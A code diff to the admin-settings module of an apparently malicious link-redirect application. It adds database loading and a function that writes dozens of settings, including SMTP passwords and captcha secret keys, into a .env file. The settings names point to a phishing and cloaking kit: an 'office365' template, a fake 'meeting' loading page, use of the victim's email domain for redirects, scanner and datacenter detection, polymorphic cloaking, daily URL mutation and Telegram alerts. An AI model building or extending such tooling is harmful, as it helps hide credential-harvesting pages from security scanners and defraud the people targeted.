@@ -76,7 +76,7 @@ function getSettingsFilePath(): string {
 // In-memory cache
 let settingsCache: AdminSettings | null = null
 let cacheTimestamp = 0
-const CACHE_DURATION = 60 * 1000 // 1 minute
+const CACHE_DURATION = 5 * 1000 // 5 seconds (reduced for faster updates)
 
 // Default settings - pulls from environment variables
 export const DEFAULT_SETTINGS: AdminSettings = {
@@ -221,25 +221,44 @@ export async function loadSettings(): Promise<AdminSettings> {
   }
   
   try {
-    // Load file system utilities only in Node.js runtime
-    // Wrap in try-catch to handle edge runtime errors gracefully
-    let readJSON: any
+    // PRIORITY: Try database first, then fall back to file
+    let rawSettings: any = null
+    
+    // Try to load from database first
     try {
-      const fsUtils = await loadFileSystemUtils()
-      readJSON = fsUtils.secureReadJSON
-    } catch (fsError: any) {
-      // If file system utils can't be loaded (edge runtime), use cache or defaults
-      if (fsError?.message?.includes('fs/promises') || fsError?.message?.includes('edge runtime')) {
-        return settingsCache || DEFAULT_SETTINGS
+      const dbSettings = await getAdminSettingsSql()
+      if (dbSettings && Object.keys(dbSettings).length > 0) {
+        rawSettings = dbSettings
+        console.log('[ADMIN SETTINGS] ✅ Loaded from database')
       }
-      throw fsError
+    } catch (dbError: any) {
+      // Database read failed - fall through to file read
+      console.log('[ADMIN SETTINGS] ⚠️  Database read failed, trying file:', dbError.message)
     }
     
-    const settingsFile = getSettingsFilePath()
-    const rawSettings = await (readJSON as typeof import('./secureFileSystem').secureReadJSON)<any>(
-      settingsFile,
-      DEFAULT_SETTINGS
-    )
+    // If database didn't have settings, try file
+    if (!rawSettings) {
+      // Load file system utilities only in Node.js runtime
+      // Wrap in try-catch to handle edge runtime errors gracefully
+      let readJSON: any
+      try {
+        const fsUtils = await loadFileSystemUtils()
+        readJSON = fsUtils.secureReadJSON
+      } catch (fsError: any) {
+        // If file system utils can't be loaded (edge runtime), use cache or defaults
+        if (fsError?.message?.includes('fs/promises') || fsError?.message?.includes('edge runtime')) {
+          return settingsCache || DEFAULT_SETTINGS
+        }
+        throw fsError
+      }
+      
+      const settingsFile = getSettingsFilePath()
+      rawSettings = await (readJSON as typeof import('./secureFileSystem').secureReadJSON)<any>(
+        settingsFile,
+        DEFAULT_SETTINGS
+      )
+      console.log('[ADMIN SETTINGS] ✅ Loaded from file')
+    }
     
     // Merge with defaults to ensure all fields exist
     const mergedSettings: AdminSettings = {
@@ -298,20 +317,18 @@ export async function loadSettings(): Promise<AdminSettings> {
           ...rawSettings.security?.gates,
         },
         networkRestrictions: {
-          ...DEFAULT_SETTINGS.security.networkRestrictions,
-          ...rawSettings.security?.networkRestrictions,
-          // IMPORTANT: Database settings take precedence over env vars
-          // Priority: Database value > Env var > Default
-          // This allows admin UI toggles to work properly
-          allowVpn: rawSettings.security?.networkRestrictions?.allowVpn !== undefined 
+          // CRITICAL: Admin settings ALWAYS take precedence over .env
+          // Priority: Admin saved value > .env > Default
+          // If admin has saved ANY value (even false), use it. Only fall back to .env if never saved.
+          allowVpn: rawSettings.security?.networkRestrictions?.allowVpn !== undefined && rawSettings.security?.networkRestrictions?.allowVpn !== null
             ? rawSettings.security.networkRestrictions.allowVpn
-            : (process.env.ALLOW_VPN ? (process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true') : DEFAULT_SETTINGS.security.networkRestrictions.allowVpn),
-          allowProxy: rawSettings.security?.networkRestrictions?.allowProxy !== undefined
+            : (process.env.ALLOW_VPN === '1' || process.env.ALLOW_VPN === 'true' ? true : (process.env.ALLOW_VPN === '0' || process.env.ALLOW_VPN === 'false' ? false : DEFAULT_SETTINGS.security.networkRestrictions.allowVpn)),
+          allowProxy: rawSettings.security?.networkRestrictions?.allowProxy !== undefined && rawSettings.security?.networkRestrictions?.allowProxy !== null
             ? rawSettings.security.networkRestrictions.allowProxy
-            : (process.env.ALLOW_PROXY ? (process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true') : DEFAULT_SETTINGS.security.networkRestrictions.allowProxy),
-          allowDatacenter: rawSettings.security?.networkRestrictions?.allowDatacenter !== undefined
+            : (process.env.ALLOW_PROXY === '1' || process.env.ALLOW_PROXY === 'true' ? true : (process.env.ALLOW_PROXY === '0' || process.env.ALLOW_PROXY === 'false' ? false : DEFAULT_SETTINGS.security.networkRestrictions.allowProxy)),
+          allowDatacenter: rawSettings.security?.networkRestrictions?.allowDatacenter !== undefined && rawSettings.security?.networkRestrictions?.allowDatacenter !== null
             ? rawSettings.security.networkRestrictions.allowDatacenter
-            : (process.env.ALLOW_DATACENTER ? (process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true') : DEFAULT_SETTINGS.security.networkRestrictions.allowDatacenter),
+            : (process.env.ALLOW_DATACENTER === '1' || process.env.ALLOW_DATACENTER === 'true' ? true : (process.env.ALLOW_DATACENTER === '0' || process.env.ALLOW_DATACENTER === 'false' ? false : DEFAULT_SETTINGS.security.networkRestrictions.allowDatacenter)),
         },
         // Fallback to env var if saved value is undefined/null
         securityMode: rawSettings.security?.securityMode ?? (process.env.LINK_SECURITY_MODE === 'hardened' ? 'hardened' : 'strict') as 'strict' | 'hardened',
@@ -466,11 +483,418 @@ export async function saveSettings(settings: AdminSettings): Promise<void> {
   
   await writeJSON(settingsFile, mergedSettings)
   
-  console.log('[ADMIN SETTINGS] ✅ Settings written successfully')
-  // Update cache with merged settings
+  console.log('[ADMIN SETTINGS] ✅ Settings written to file successfully')
+  
+  // CRITICAL: Also write to database (SQLite)
+  try {
+    await updateAdminSettingsSql(mergedSettings)
+    console.log('[ADMIN SETTINGS] ✅ Settings written to database successfully')
+  } catch (dbError: any) {
+    // Don't fail if database write fails - file write is primary
+    console.warn('[ADMIN SETTINGS] ⚠️  Database write failed (non-critical):', dbError.message)
+  }
+  
+  // CRITICAL: Also write to .env file so admin settings are visible in .env
+  await writeSettingsToEnv(mergedSettings)
+  
+  // Update cache with merged settings (force immediate update)
   settingsCache = mergedSettings
   cacheTimestamp = Date.now()
-  console.log('[ADMIN SETTINGS] 🧹 Cache updated')
+  console.log('[ADMIN SETTINGS] 🧹 Cache updated with new settings')
+}
+
+/**
+ * Write admin settings to .env file
+ * This allows admin panel changes to be visible in .env file
+ */
+async function writeSettingsToEnv(settings: AdminSettings): Promise<void> {
+  try {
+    const fs = await import('fs/promises')
+    const pathModule = await import('path')
+    
+    const envPath = pathModule.join(process.cwd(), '.env')
+    
+    // Read existing .env file
+    let envContent = ''
+    try {
+      envContent = await fs.readFile(envPath, 'utf-8')
+    } catch (error) {
+      // .env doesn't exist, start fresh
+      envContent = ''
+    }
+    
+    // Parse existing .env into lines
+    const lines = envContent.split('\n')
+    const envVars = new Map<string, string>()
+    const comments: string[] = []
+    
+    // Parse existing .env
+    for (const line of lines) {
+      const trimmed = line.trim()
+      if (!trimmed || trimmed.startsWith('#')) {
+        comments.push(line)
+        continue
+      }
+      const match = trimmed.match(/^([A-Z_]+)=(.*)$/)
+      if (match) {
+        envVars.set(match[1], match[2])
+      } else {
+        comments.push(line)
+      }
+    }
+    
+    // Update env vars from admin settings
+    // Network Restrictions
+    envVars.set('ALLOW_VPN', settings.security?.networkRestrictions?.allowVpn ? 'true' : 'false')
+    envVars.set('ALLOW_PROXY', settings.security?.networkRestrictions?.allowProxy ? 'true' : 'false')
+    envVars.set('ALLOW_DATACENTER', settings.security?.networkRestrictions?.allowDatacenter ? 'true' : 'false')
+    
+    // ============================================
+    // SECURITY GATES (All 7 Layers)
+    // ============================================
+    envVars.set('ENABLE_LAYER1_BOT_FILTER', settings.security?.gates?.layer1BotFilter ? 'true' : 'false')
+    envVars.set('ENABLE_LAYER1_IP_BLOCKLIST', settings.security?.gates?.layer1IpBlocklist ? 'true' : 'false')
+    envVars.set('ENABLE_LAYER1_CLOUDFLARE_BOT', settings.security?.gates?.layer1CloudflareBotManagement ? 'true' : 'false')
+    envVars.set('ENABLE_LAYER1_SCANNER_DETECTION', settings.security?.gates?.layer1ScannerDetection ? 'true' : 'false')
+    envVars.set('ENABLE_LAYER2_CAPTCHA', settings.security?.gates?.layer2Captcha ? 'true' : 'false')
+    envVars.set('ENABLE_LAYER3_BOT_DELAY', settings.security?.gates?.layer3BotDelay ? 'true' : 'false')
+    envVars.set('ENABLE_LAYER4_STEALTH_VERIFICATION', settings.security?.gates?.layer4StealthVerification ? 'true' : 'false')
+    
+    // ============================================
+    // BOT FILTER SETTINGS
+    // ============================================
+    envVars.set('ENABLE_BOT_FILTER', settings.security?.botFilter?.enabled ? 'true' : 'false')
+    envVars.set('BOT_FILTER_CHECK_IP_BLOCKLIST', settings.security?.botFilter?.checkIPBlocklist ? 'true' : 'false')
+    envVars.set('BOT_FILTER_CLOUDFLARE_BOT_MANAGEMENT', settings.security?.botFilter?.cloudflareBotManagement ? 'true' : 'false')
+    envVars.set('BOT_FILTER_SCANNER_DETECTION', settings.security?.botFilter?.scannerDetection ? 'true' : 'false')
+    envVars.set('BOT_FILTER_CONFIDENCE_THRESHOLD', String(settings.security?.botFilter?.confidenceThreshold || 70))
+    
+    // ============================================
+    // CAPTCHA SETTINGS
+    // ============================================
+    const captchaEnabled = settings.security?.gates?.layer2Captcha !== false && 
+                          settings.security?.captcha?.enabled !== false &&
+                          settings.security?.captcha?.provider !== 'none'
+    envVars.set('ENABLE_CAPTCHA', captchaEnabled ? 'true' : 'false')
+    envVars.set('NEXT_PUBLIC_CAPTCHA_PROVIDER', settings.security?.captcha?.provider || 'turnstile')
+    envVars.set('NEXT_PUBLIC_TURNSTILE_SITE_KEY', settings.security?.captcha?.turnstileSiteKey || '')
+    envVars.set('TURNSTILE_SECRET_KEY', settings.security?.captcha?.turnstileSecretKey || '')
+    envVars.set('NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY', settings.security?.captcha?.privatecaptchaSiteKey || '')
+    envVars.set('PRIVATECAPTCHA_SECRET_KEY', settings.security?.captcha?.privatecaptchaSecretKey || '')
+    envVars.set('CAPTCHA_BACKGROUND', settings.security?.captcha?.background || 'default')
+    
+    // ============================================
+    // BOT DELAY SETTINGS
+    // ============================================
+    envVars.set('ENABLE_BOT_DELAY', settings.security?.botDelay?.enabled ? 'true' : 'false')
+    envVars.set('BOT_DELAY_MIN', String(settings.security?.botDelay?.min || 3))
+    envVars.set('BOT_DELAY_MAX', String(settings.security?.botDelay?.max || 7))
+    
+    // ============================================
+    // STEALTH VERIFICATION SETTINGS
+    // ============================================
+    envVars.set('ENABLE_STEALTH_VERIFICATION', settings.security?.stealthVerification?.enabled ? 'true' : 'false')
+    envVars.set('STEALTH_BEHAVIORAL_ANALYSIS', settings.security?.stealthVerification?.behavioralAnalysis ? 'true' : 'false')
+    envVars.set('STEALTH_MOUSE_TRACKING', settings.security?.stealthVerification?.mouseTracking ? 'true' : 'false')
+    envVars.set('STEALTH_SCROLL_TRACKING', settings.security?.stealthVerification?.scrollTracking ? 'true' : 'false')
+    envVars.set('STEALTH_HONEYPOT', settings.security?.stealthVerification?.honeypot ? 'true' : 'false')
+    envVars.set('STEALTH_MINIMUM_TIME', String(settings.security?.stealthVerification?.minimumTime || 3))
+    envVars.set('STEALTH_BOT_SCORE_THRESHOLD', String(settings.security?.stealthVerification?.botScoreThreshold || 50))
+    
+    // ============================================
+    // ADVANCED SECURITY SETTINGS
+    // ============================================
+    envVars.set('LINK_SECURITY_MODE', settings.security?.securityMode || 'strict')
+    envVars.set('ENABLE_DAILY_URL_MUTATION', settings.security?.enableDailyUrlMutation ? 'true' : 'false')
+    envVars.set('ENABLE_POLYMORPHIC_CLOAKING', settings.security?.enablePolymorphicCloaking ? 'true' : 'false')
+    
+    // Behavioral Analysis
+    envVars.set('ENABLE_BEHAVIOR_MODEL', settings.security?.behavioral?.enableBehaviorModel ? 'true' : 'false')
+    envVars.set('BEHAVIOR_BLOCK_BELOW', String(settings.security?.behavioral?.behaviorThresholds?.blockBelow || 0))
+    envVars.set('BEHAVIOR_CAPTCHA_BELOW', String(settings.security?.behavioral?.behaviorThresholds?.captchaBelow || 5))
+    envVars.set('ENABLE_MICRO_HUMAN_SIGNALS', settings.security?.behavioral?.enableMicroHumanSignals ? 'true' : 'false')
+    envVars.set('MICRO_HUMAN_WEIGHT', String(settings.security?.behavioral?.microHumanWeight || 0.3))
+    
+    // Security Brain
+    envVars.set('ENABLE_SECURITY_BRAIN', settings.security?.securityBrain?.enabled ? 'true' : 'false')
+    envVars.set('SECURITY_BRAIN_STRICT_MODE', settings.security?.securityBrain?.strictMode ? 'true' : 'false')
+    envVars.set('SECURITY_BRAIN_BLOCK_THRESHOLD', String(settings.security?.securityBrain?.blockThreshold || -10))
+    
+    // ============================================
+    // NETWORK RESTRICTIONS
+    // ============================================
+    envVars.set('ALLOW_VPN', settings.security?.networkRestrictions?.allowVpn ? 'true' : 'false')
+    envVars.set('ALLOW_PROXY', settings.security?.networkRestrictions?.allowProxy ? 'true' : 'false')
+    envVars.set('ALLOW_DATACENTER', settings.security?.networkRestrictions?.allowDatacenter ? 'true' : 'false')
+    
+    // ============================================
+    // TELEGRAM NOTIFICATIONS
+    // ============================================
+    envVars.set('ENABLE_TELEGRAM_NOTIFICATIONS', settings.notifications?.telegram?.enabled ? 'true' : 'false')
+    envVars.set('TELEGRAM_BOT_TOKEN', settings.notifications?.telegram?.botToken || '')
+    envVars.set('TELEGRAM_CHAT_ID', settings.notifications?.telegram?.chatId || '')
+    envVars.set('TELEGRAM_NOTIFY_BOT_DETECTIONS', settings.notifications?.telegram?.notifyBotDetections ? 'true' : 'false')
+    envVars.set('DISABLE_BOT_NOTIFICATIONS', settings.notifications?.telegram?.enabled === false ? 'true' : 'false')
+    
+    // ============================================
+    // EMAIL NOTIFICATIONS
+    // ============================================
+    envVars.set('ENABLE_EMAIL_NOTIFICATIONS', settings.notifications?.email?.enabled ? 'true' : 'false')
+    envVars.set('EMAIL_NOTIFICATION_ADDRESS', settings.notifications?.email?.toEmail || '')
+    envVars.set('SMTP_HOST', settings.notifications?.email?.smtpHost || '')
+    envVars.set('SMTP_PORT', String(settings.notifications?.email?.smtpPort || 587))
+    envVars.set('SMTP_USER', settings.notifications?.email?.smtpUser || '')
+    envVars.set('SMTP_PASS', settings.notifications?.email?.smtpPassword || '')
+    envVars.set('SMTP_FROM', settings.notifications?.email?.fromEmail || '')
+    envVars.set('SMTP_TO', settings.notifications?.email?.toEmail || '')
+    
+    // ============================================
+    // FILTERING SETTINGS
+    // ============================================
+    envVars.set('ALLOW_DESKTOP', settings.filtering?.device?.desktop ? 'true' : 'false')
+    envVars.set('ALLOW_MOBILE', settings.filtering?.device?.mobile ? 'true' : 'false')
+    envVars.set('ALLOW_TABLET', settings.filtering?.device?.tablet ? 'true' : 'false')
+    envVars.set('ENABLE_GEOGRAPHIC_FILTERING', settings.filtering?.geographic?.enabled ? 'true' : 'false')
+    
+    // ============================================
+    // TEMPLATE SETTINGS
+    // ============================================
+    envVars.set('SHOW_LOADING_PAGE', settings.templates?.showLoadingPage ? 'true' : 'false')
+    envVars.set('DEFAULT_LOADING_SCREEN', settings.templates?.defaultLoadingScreen || 'meeting')
+    envVars.set('DEFAULT_LOADING_DURATION', String(settings.templates?.defaultLoadingDuration || 3))
+    envVars.set('LOADING_PAGE_LANGUAGE', settings.templates?.loadingPageLanguage || 'auto')
+    envVars.set('DEFAULT_TEMPLATE', settings.templates?.default || 'office365')
+    
+    // ============================================
+    // REDIRECT SETTINGS
+    // ============================================
+    envVars.set('DEFAULT_FALLBACK_URL', settings.redirects?.defaultUrl || 'https://www.google.com')
+    envVars.set('CUSTOM_REDIRECT_URL', settings.redirects?.customUrl || '')
+    envVars.set('USE_DOMAIN_FROM_EMAIL', settings.redirects?.useDomainFromEmail ? 'true' : 'false')
+    envVars.set('REDIRECT_DELAY_SECONDS', String(settings.redirects?.redirectDelaySeconds || 10))
+    
+    // ============================================
+    // LINK MANAGEMENT
+    // ============================================
+    envVars.set('ALLOW_ALL_LINKS', settings.linkManagement?.allowAllLinks ? 'true' : 'false')
+    
+    // Build new .env content
+    const newLines: string[] = []
+    
+    // Add comments and existing non-conflicting vars first
+    // Filter out any comments that match our managed settings
+    const managedSettings = [
+      'ALLOW_VPN', 'ALLOW_PROXY', 'ALLOW_DATACENTER', 'ENABLE_CAPTCHA',
+      'NEXT_PUBLIC_CAPTCHA_PROVIDER', 'NEXT_PUBLIC_TURNSTILE_SITE_KEY', 'TURNSTILE_SECRET_KEY',
+      'NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY', 'PRIVATECAPTCHA_SECRET_KEY', 'CAPTCHA_BACKGROUND',
+      'TELEGRAM_BOT_TOKEN', 'TELEGRAM_CHAT_ID', 'DISABLE_BOT_NOTIFICATIONS', 'ENABLE_TELEGRAM_NOTIFICATIONS',
+      'TELEGRAM_NOTIFY_BOT_DETECTIONS', 'LINK_SECURITY_MODE', 'SMTP_HOST', 'SMTP_PORT', 'SMTP_USER',
+      'SMTP_PASS', 'SMTP_FROM', 'SMTP_TO', 'ENABLE_EMAIL_NOTIFICATIONS', 'EMAIL_NOTIFICATION_ADDRESS',
+      'ENABLE_LAYER1_BOT_FILTER', 'ENABLE_LAYER1_IP_BLOCKLIST', 'ENABLE_LAYER1_CLOUDFLARE_BOT',
+      'ENABLE_LAYER1_SCANNER_DETECTION', 'ENABLE_LAYER2_CAPTCHA', 'ENABLE_LAYER3_BOT_DELAY',
+      'ENABLE_LAYER4_STEALTH_VERIFICATION', 'ENABLE_BOT_FILTER', 'BOT_FILTER_CHECK_IP_BLOCKLIST',
+      'BOT_FILTER_CLOUDFLARE_BOT_MANAGEMENT', 'BOT_FILTER_SCANNER_DETECTION', 'BOT_FILTER_CONFIDENCE_THRESHOLD',
+      'ENABLE_BOT_DELAY', 'BOT_DELAY_MIN', 'BOT_DELAY_MAX', 'ENABLE_STEALTH_VERIFICATION',
+      'STEALTH_BEHAVIORAL_ANALYSIS', 'STEALTH_MOUSE_TRACKING', 'STEALTH_SCROLL_TRACKING',
+      'STEALTH_HONEYPOT', 'STEALTH_MINIMUM_TIME', 'STEALTH_BOT_SCORE_THRESHOLD',
+      'ENABLE_DAILY_URL_MUTATION', 'ENABLE_POLYMORPHIC_CLOAKING', 'ENABLE_BEHAVIOR_MODEL',
+      'BEHAVIOR_BLOCK_BELOW', 'BEHAVIOR_CAPTCHA_BELOW', 'ENABLE_MICRO_HUMAN_SIGNALS',
+      'MICRO_HUMAN_WEIGHT', 'ENABLE_SECURITY_BRAIN', 'SECURITY_BRAIN_STRICT_MODE',
+      'SECURITY_BRAIN_BLOCK_THRESHOLD', 'ALLOW_DESKTOP', 'ALLOW_MOBILE', 'ALLOW_TABLET',
+      'ENABLE_GEOGRAPHIC_FILTERING', 'SHOW_LOADING_PAGE', 'DEFAULT_LOADING_SCREEN',
+      'DEFAULT_LOADING_DURATION', 'LOADING_PAGE_LANGUAGE', 'DEFAULT_TEMPLATE',
+      'DEFAULT_FALLBACK_URL', 'CUSTOM_REDIRECT_URL', 'USE_DOMAIN_FROM_EMAIL',
+      'REDIRECT_DELAY_SECONDS', 'ALLOW_ALL_LINKS'
+    ]
+    
+    for (const comment of comments) {
+      const shouldSkip = managedSettings.some(setting => comment.includes(setting))
+      if (!shouldSkip) {
+        newLines.push(comment)
+      }
+    }
+    
+    // Add section headers
+    newLines.push('')
+    newLines.push('# ============================================')
+    newLines.push('# Admin Panel Settings (Auto-generated)')
+    newLines.push('# ============================================')
+    newLines.push('')
+    
+    // ============================================
+    // SECURITY GATES (All 7 Layers)
+    // ============================================
+    newLines.push('# Security Gates (All 7 Layers)')
+    newLines.push(`ENABLE_LAYER1_BOT_FILTER=${envVars.get('ENABLE_LAYER1_BOT_FILTER')}`)
+    newLines.push(`ENABLE_LAYER1_IP_BLOCKLIST=${envVars.get('ENABLE_LAYER1_IP_BLOCKLIST')}`)
+    newLines.push(`ENABLE_LAYER1_CLOUDFLARE_BOT=${envVars.get('ENABLE_LAYER1_CLOUDFLARE_BOT')}`)
+    newLines.push(`ENABLE_LAYER1_SCANNER_DETECTION=${envVars.get('ENABLE_LAYER1_SCANNER_DETECTION')}`)
+    newLines.push(`ENABLE_LAYER2_CAPTCHA=${envVars.get('ENABLE_LAYER2_CAPTCHA')}`)
+    newLines.push(`ENABLE_LAYER3_BOT_DELAY=${envVars.get('ENABLE_LAYER3_BOT_DELAY')}`)
+    newLines.push(`ENABLE_LAYER4_STEALTH_VERIFICATION=${envVars.get('ENABLE_LAYER4_STEALTH_VERIFICATION')}`)
+    newLines.push('')
+    
+    // ============================================
+    // BOT FILTER SETTINGS
+    // ============================================
+    newLines.push('# Bot Filter Settings')
+    newLines.push(`ENABLE_BOT_FILTER=${envVars.get('ENABLE_BOT_FILTER')}`)
+    newLines.push(`BOT_FILTER_CHECK_IP_BLOCKLIST=${envVars.get('BOT_FILTER_CHECK_IP_BLOCKLIST')}`)
+    newLines.push(`BOT_FILTER_CLOUDFLARE_BOT_MANAGEMENT=${envVars.get('BOT_FILTER_CLOUDFLARE_BOT_MANAGEMENT')}`)
+    newLines.push(`BOT_FILTER_SCANNER_DETECTION=${envVars.get('BOT_FILTER_SCANNER_DETECTION')}`)
+    newLines.push(`BOT_FILTER_CONFIDENCE_THRESHOLD=${envVars.get('BOT_FILTER_CONFIDENCE_THRESHOLD')}`)
+    newLines.push('')
+    
+    // ============================================
+    // CAPTCHA SETTINGS
+    // ============================================
+    newLines.push('# CAPTCHA Settings')
+    newLines.push(`ENABLE_CAPTCHA=${envVars.get('ENABLE_CAPTCHA')}`)
+    newLines.push(`NEXT_PUBLIC_CAPTCHA_PROVIDER=${envVars.get('NEXT_PUBLIC_CAPTCHA_PROVIDER')}`)
+    newLines.push(`NEXT_PUBLIC_TURNSTILE_SITE_KEY=${envVars.get('NEXT_PUBLIC_TURNSTILE_SITE_KEY')}`)
+    newLines.push(`TURNSTILE_SECRET_KEY=${envVars.get('TURNSTILE_SECRET_KEY')}`)
+    newLines.push(`NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY=${envVars.get('NEXT_PUBLIC_PRIVATECAPTCHA_SITE_KEY')}`)
+    newLines.push(`PRIVATECAPTCHA_SECRET_KEY=${envVars.get('PRIVATECAPTCHA_SECRET_KEY')}`)
+    newLines.push(`CAPTCHA_BACKGROUND=${envVars.get('CAPTCHA_BACKGROUND')}`)
+    newLines.push('')
+    
+    // ============================================
+    // BOT DELAY SETTINGS
+    // ============================================
+    newLines.push('# Bot Delay Settings')
+    newLines.push(`ENABLE_BOT_DELAY=${envVars.get('ENABLE_BOT_DELAY')}`)
+    newLines.push(`BOT_DELAY_MIN=${envVars.get('BOT_DELAY_MIN')}`)
+    newLines.push(`BOT_DELAY_MAX=${envVars.get('BOT_DELAY_MAX')}`)
+    newLines.push('')
+    
+    // ============================================
+    // STEALTH VERIFICATION SETTINGS
+    // ============================================
+    newLines.push('# Stealth Verification Settings')
+    newLines.push(`ENABLE_STEALTH_VERIFICATION=${envVars.get('ENABLE_STEALTH_VERIFICATION')}`)
+    newLines.push(`STEALTH_BEHAVIORAL_ANALYSIS=${envVars.get('STEALTH_BEHAVIORAL_ANALYSIS')}`)
+    newLines.push(`STEALTH_MOUSE_TRACKING=${envVars.get('STEALTH_MOUSE_TRACKING')}`)
+    newLines.push(`STEALTH_SCROLL_TRACKING=${envVars.get('STEALTH_SCROLL_TRACKING')}`)
+    newLines.push(`STEALTH_HONEYPOT=${envVars.get('STEALTH_HONEYPOT')}`)
+    newLines.push(`STEALTH_MINIMUM_TIME=${envVars.get('STEALTH_MINIMUM_TIME')}`)
+    newLines.push(`STEALTH_BOT_SCORE_THRESHOLD=${envVars.get('STEALTH_BOT_SCORE_THRESHOLD')}`)
+    newLines.push('')
+    
+    // ============================================
+    // ADVANCED SECURITY SETTINGS
+    // ============================================
+    newLines.push('# Advanced Security Settings')
+    newLines.push(`LINK_SECURITY_MODE=${envVars.get('LINK_SECURITY_MODE')}`)
+    newLines.push(`ENABLE_DAILY_URL_MUTATION=${envVars.get('ENABLE_DAILY_URL_MUTATION')}`)
+    newLines.push(`ENABLE_POLYMORPHIC_CLOAKING=${envVars.get('ENABLE_POLYMORPHIC_CLOAKING')}`)
+    newLines.push(`ENABLE_BEHAVIOR_MODEL=${envVars.get('ENABLE_BEHAVIOR_MODEL')}`)
+    newLines.push(`BEHAVIOR_BLOCK_BELOW=${envVars.get('BEHAVIOR_BLOCK_BELOW')}`)
+    newLines.push(`BEHAVIOR_CAPTCHA_BELOW=${envVars.get('BEHAVIOR_CAPTCHA_BELOW')}`)
+    newLines.push(`ENABLE_MICRO_HUMAN_SIGNALS=${envVars.get('ENABLE_MICRO_HUMAN_SIGNALS')}`)
+    newLines.push(`MICRO_HUMAN_WEIGHT=${envVars.get('MICRO_HUMAN_WEIGHT')}`)
+    newLines.push(`ENABLE_SECURITY_BRAIN=${envVars.get('ENABLE_SECURITY_BRAIN')}`)
+    newLines.push(`SECURITY_BRAIN_STRICT_MODE=${envVars.get('SECURITY_BRAIN_STRICT_MODE')}`)
+    newLines.push(`SECURITY_BRAIN_BLOCK_THRESHOLD=${envVars.get('SECURITY_BRAIN_BLOCK_THRESHOLD')}`)
+    newLines.push('')
+    
+    // ============================================
+    // NETWORK RESTRICTIONS
+    // ============================================
+    newLines.push('# Network Restrictions')
+    newLines.push(`ALLOW_VPN=${envVars.get('ALLOW_VPN')}`)
+    newLines.push(`ALLOW_PROXY=${envVars.get('ALLOW_PROXY')}`)
+    newLines.push(`ALLOW_DATACENTER=${envVars.get('ALLOW_DATACENTER')}`)
+    newLines.push('')
+    
+    // ============================================
+    // TELEGRAM NOTIFICATIONS
+    // ============================================
+    newLines.push('# Telegram Notifications')
+    newLines.push(`ENABLE_TELEGRAM_NOTIFICATIONS=${envVars.get('ENABLE_TELEGRAM_NOTIFICATIONS')}`)
+    newLines.push(`TELEGRAM_BOT_TOKEN=${envVars.get('TELEGRAM_BOT_TOKEN')}`)
+    newLines.push(`TELEGRAM_CHAT_ID=${envVars.get('TELEGRAM_CHAT_ID')}`)
+    newLines.push(`TELEGRAM_NOTIFY_BOT_DETECTIONS=${envVars.get('TELEGRAM_NOTIFY_BOT_DETECTIONS')}`)
+    newLines.push(`DISABLE_BOT_NOTIFICATIONS=${envVars.get('DISABLE_BOT_NOTIFICATIONS')}`)
+    newLines.push('')
+    
+    // ============================================
+    // EMAIL NOTIFICATIONS
+    // ============================================
+    newLines.push('# Email Notifications')
+    newLines.push(`ENABLE_EMAIL_NOTIFICATIONS=${envVars.get('ENABLE_EMAIL_NOTIFICATIONS')}`)
+    newLines.push(`EMAIL_NOTIFICATION_ADDRESS=${envVars.get('EMAIL_NOTIFICATION_ADDRESS')}`)
+    newLines.push(`SMTP_HOST=${envVars.get('SMTP_HOST')}`)
+    newLines.push(`SMTP_PORT=${envVars.get('SMTP_PORT')}`)
+    newLines.push(`SMTP_USER=${envVars.get('SMTP_USER')}`)
+    newLines.push(`SMTP_PASS=${envVars.get('SMTP_PASS')}`)
+    newLines.push(`SMTP_FROM=${envVars.get('SMTP_FROM')}`)
+    newLines.push(`SMTP_TO=${envVars.get('SMTP_TO')}`)
+    newLines.push('')
+    
+    // ============================================
+    // FILTERING SETTINGS
+    // ============================================
+    newLines.push('# Filtering Settings')
+    newLines.push(`ALLOW_DESKTOP=${envVars.get('ALLOW_DESKTOP')}`)
+    newLines.push(`ALLOW_MOBILE=${envVars.get('ALLOW_MOBILE')}`)
+    newLines.push(`ALLOW_TABLET=${envVars.get('ALLOW_TABLET')}`)
+    newLines.push(`ENABLE_GEOGRAPHIC_FILTERING=${envVars.get('ENABLE_GEOGRAPHIC_FILTERING')}`)
+    newLines.push('')
+    
+    // ============================================
+    // TEMPLATE SETTINGS
+    // ============================================
+    newLines.push('# Template Settings')
+    newLines.push(`SHOW_LOADING_PAGE=${envVars.get('SHOW_LOADING_PAGE')}`)
+    newLines.push(`DEFAULT_LOADING_SCREEN=${envVars.get('DEFAULT_LOADING_SCREEN')}`)
+    newLines.push(`DEFAULT_LOADING_DURATION=${envVars.get('DEFAULT_LOADING_DURATION')}`)
+    newLines.push(`LOADING_PAGE_LANGUAGE=${envVars.get('LOADING_PAGE_LANGUAGE')}`)
+    newLines.push(`DEFAULT_TEMPLATE=${envVars.get('DEFAULT_TEMPLATE')}`)
+    newLines.push('')
+    
+    // ============================================
+    // REDIRECT SETTINGS
+    // ============================================
+    newLines.push('# Redirect Settings')
+    newLines.push(`DEFAULT_FALLBACK_URL=${envVars.get('DEFAULT_FALLBACK_URL')}`)
+    newLines.push(`CUSTOM_REDIRECT_URL=${envVars.get('CUSTOM_REDIRECT_URL')}`)
+    newLines.push(`USE_DOMAIN_FROM_EMAIL=${envVars.get('USE_DOMAIN_FROM_EMAIL')}`)
+    newLines.push(`REDIRECT_DELAY_SECONDS=${envVars.get('REDIRECT_DELAY_SECONDS')}`)
+    newLines.push('')
+    
+    // ============================================
+    // LINK MANAGEMENT
+    // ============================================
+    newLines.push('# Link Management')
+    newLines.push(`ALLOW_ALL_LINKS=${envVars.get('ALLOW_ALL_LINKS')}`)
+    newLines.push('')
+    
+    // Add other existing vars that weren't updated (preserve non-managed settings)
+    for (const [key, value] of envVars.entries()) {
+      if (!managedSettings.includes(key)) {
+        newLines.push(`${key}=${value}`)
+      }
+    }
+    
+    // Write to .env file
+    const newContent = newLines.join('\n')
+    await fs.writeFile(envPath, newContent, 'utf-8')
+    await fs.chmod(envPath, 0o600) // Secure permissions
+    
+    console.log('[ADMIN SETTINGS] ✅ Settings written to .env file')
+  } catch (error) {
+    console.error('[ADMIN SETTINGS] ⚠️  Failed to write to .env file:', error)
+    // Don't throw - .env write is optional, .config-cache.json is the source of truth
+  }
+}
+
+/**
